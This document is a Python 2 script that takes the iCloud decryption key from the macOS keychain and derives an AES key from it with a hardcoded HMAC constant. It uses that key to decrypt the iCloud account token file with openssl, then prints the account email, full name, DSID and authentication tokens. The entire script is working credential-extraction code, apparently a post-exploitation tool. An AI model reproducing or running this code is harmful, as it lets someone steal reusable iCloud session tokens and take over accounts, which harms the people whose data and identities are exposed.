import base64, hashlib, hmac, subprocess, sys, glob, os, binascii
from Foundation import NSData, NSPropertyListSerialization
iCloudKey = subprocess.check_output("security find-generic-password -ws 'iCloud' | awk {'print $1'}", shell=True).replace("\n", "")
if iCloudKey == "":
	print "ERROR getting iCloud Decryption Key"
	sys.exit()
msg = base64.b64decode(iCloudKey)
#Constant key used for hashing Hmac on all versions of MacOS. 
#this is the secret to the decryption!
#/System/Library/PrivateFrameworks/AOSKit.framework/Versions/A/AOSKit yields the following subroutine
#KeychainAccountStorage _generateKeyFromData:
#that uses the below key that calls CCHmac to generate a Hmac that serves as the decryption key
key = "t9s\"lx^awe.580Gj%'ld+0LG<#9xa?>vb)-fkwb92[}"
#create Hmac with this key and iCloudKey using md5
hashed = hmac.new(key, msg, digestmod=hashlib.md5).digest()
hexedKey = binascii.hexlify(hashed) #turn into hex for openssl subprocess
IV = 16 * '0'
mmeTokenFile = glob.glob("%s/Library/Application Support/iCloud/Accounts/*" % os.path.expanduser("~"))
for x in mmeTokenFile:
	try:
		int(x.split("/")[-1]) #if we can cast to int, that means we have the DSID / account file. 
		mmeTokenFile = x
	except ValueError:
		continue
if not isinstance(mmeTokenFile, str):
	print "Could not find MMeTokenFile. You can specify the file manually."
	sys.exit()
else:
	print "Decrypting token plist -> [%s]\n" % mmeTokenFile
#perform decryption with zero dependencies by using openssl binary
decryptedBinary = subprocess.check_output("openssl enc -d -aes-128-cbc -iv '%s' -K %s < '%s'" % (IV, hexedKey, mmeTokenFile), shell=True)
#convert the decrypted binary plist to an NSData object that can be read
binToPlist = NSData.dataWithBytes_length_(decryptedBinary, len(decryptedBinary))
#convert the binary NSData object into a dictionary object
tokenPlist = NSPropertyListSerialization.propertyListWithData_options_format_error_(binToPlist, 0, None, None)[0]
#ta-da
print "Successfully decrypted token plist!\n"
print "%s [%s -> %s]" % (tokenPlist["appleAccountInfo"]["primaryEmail"], tokenPlist["appleAccountInfo"]["fullName"], tokenPlist["appleAccountInfo"]["dsPrsID"])
print tokenPlist["tokens"]